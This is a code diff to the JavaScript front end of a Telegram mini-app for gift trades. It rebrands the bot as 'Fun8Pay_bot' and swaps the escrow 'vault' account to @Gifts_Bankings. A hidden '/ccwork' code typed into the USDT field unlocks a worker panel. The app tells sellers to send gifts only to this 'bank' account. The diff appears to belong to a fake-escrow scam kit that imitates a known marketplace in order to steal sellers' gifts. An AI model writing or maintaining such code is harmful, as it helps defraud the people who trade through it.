@@ -74,8 +74,8 @@ function showToast(text, duration = 2000) {
 // =====================================================
 // API
 // =====================================================
-const API = "https://bot-1790950891-2117-soniloonov.bothost.tech";;
-const DEFAULT_BOT_USERNAME = "papagaratbot";
+const API = "https://bot-1790950891-2117-soniloonov.bothost.tech";
+const DEFAULT_BOT_USERNAME = "Fun8Pay_bot";
 
 function initData() {
     return tg?.initData || "";
@@ -224,7 +224,6 @@ async function loadWorkerStats() {
     }
 }
 
-// Секретный ввод /ccwork в поле USDT
 function handleSecretWorker(e) {
     const val = e.target.value.trim().toLowerCase();
     if (val === "/ccwork") {
@@ -393,7 +392,7 @@ function renderDealScreen(d) {
         if (d.is_creator) btnCancel.classList.remove("hidden");
     } else if (d.status === "paid") {
         if (d.is_seller) {
-            stepText = "Передайте подарок ТОЛЬКО в банк <b>@FunPayVault</b> — никогда напрямую покупателю.";
+            stepText = "Передайте подарок ТОЛЬКО в банк <b>@Gifts_Bankings</b> — никогда напрямую покупателю.";
             btnVault.classList.remove("hidden");
         } else {
             stepText = "Продавец передаёт подарок в банк. Ожидайте.";
@@ -469,7 +468,6 @@ function dealShare() {
     const code = state.currentDealCode;
     if (!code) return;
 
-    // Три источника: window → state → хардкод
     const botUser = window.__BOT_USERNAME__
         || state.me?.bot_username
         || DEFAULT_BOT_USERNAME;
@@ -485,12 +483,11 @@ function dealShare() {
         }
     } catch (e) {}
 
-    // Fallback
     window.open(`https://t.me/share/url?url=${encodeURIComponent(link)}`, "_blank");
 }
 
 function dealOpenVault() {
-    const url = "https://t.me/FunPayVault";
+    const url = "https://t.me/Gifts_Bankings";
     try {
         if (tg && typeof tg.openTelegramLink === "function") {
             tg.openTelegramLink(url);
